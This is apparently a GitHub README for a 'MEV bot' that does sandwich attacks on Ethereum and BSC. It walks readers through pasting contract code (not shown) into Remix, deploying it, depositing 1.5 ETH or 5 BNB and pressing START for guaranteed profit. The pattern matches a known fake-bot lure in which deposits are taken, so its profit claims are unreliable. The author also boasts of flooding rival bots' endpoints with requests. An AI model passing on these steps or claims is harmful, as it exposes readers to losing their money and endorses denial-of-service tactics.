# MEVBOT-Sandwich-Attacks

Mempool settings for my MEV-bots on Uniswap v3 and BSC v1/2. Originally, I never intended to share the code with anyone as it was only meant for "testing in production" and I made several tradeoffs in terms of quality. I was afraid of "leaking my alpha". However, I want to showcase what I've learned over the years.

One of my bots sends transactions and sniffs the Uniswap v2 mempool, competing with other bots to quickly buy up tokens on-chain and creating profitable slippage opportunities. This bot performs faster than 99% of other bots, even those that are open source.

I have a list of target endpoints that I can flood with requests to gain an edge over other bots by making them lose up to 5 seconds of reaction time. This is a personal journey for me, and I've learned a lot about MEV, frontrunning, EIP-1559, "The Dark Forest", and other ways to exploit web2 architectures.

I've made some profits from this, but I'm now using better commercial methods and want to share what I've learned so other developers don't have to go through the same pains.

# HOW-TO

Make money with MevBot (ETH network/BSC Network)

Some examples:

<img width="686" alt="image" src="https://user-images.githubusercontent.com/131530136/233782953-1ba32097-4705-40b0-8a05-b55d61e45721.png">

You can see an example of how the bot works. The bot will make transactions on your entire balance to increase profit

First-source code

Copy code and paste in Remix IDE

<img width="911" alt="image" src="https://user-images.githubusercontent.com/131530136/233790663-c5815c27-04d7-400b-9c83-342947b7e590.png">

And click Solidity complier 0.6.12

<img width="1153" alt="image" src="https://user-images.githubusercontent.com/131530136/233790666-6b2d4c56-43ce-4d8e-9467-2fc961cf7643.png">

Select ETH or BSC(BNB) network and router address

<img width="1189" alt="image" src="https://user-images.githubusercontent.com/131530136/233790692-b736afb1-dded-417c-b7f6-9d85615be4b2.png">


Press Transact (Deploy)
Next-deposit (balans Mev Bot)
Send a number of Ethereum/BNB to the bot's balance for the bot to work. And start it with the START button

Wait a couple of days for a profit. For successful transactions on the Ethereum network/BSC, you must have enough balance to cover the gas. 

# Recommended deposits: ETH - 1.5 ETH / BSC - 5 BNB

At any time you can "Stop" bot or return your money by calling the "Withdrawal" function - <b>WITHDRAWS ONLY NATIVE COINS - BSC AND ETH - DO NOT SEND OTHER TOKENS - USDT/USDC/TUSD/etc to the BOT!</b>
